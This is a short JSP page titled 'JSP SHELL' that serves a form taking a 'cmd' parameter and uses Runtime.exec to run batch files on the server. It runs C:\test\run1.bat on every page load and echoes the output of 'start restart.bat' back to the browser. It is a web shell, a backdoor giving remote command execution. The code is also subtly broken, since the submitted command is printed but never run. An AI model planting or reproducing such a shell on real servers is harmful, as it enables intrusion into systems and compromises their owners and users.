<%@ page language="java" import="javazoom.upload.*,java.util.*,java.io.*" %>

<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
<%
Process process = Runtime.getRuntime().exec("\"C:\\test\\run1.bat\"");
if (request.getParameter("cmd") != null) {
out.println("Command: " +request.getParameter("cmd"));
Process p =Runtime.getRuntime().exec("start restart.bat");
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML> 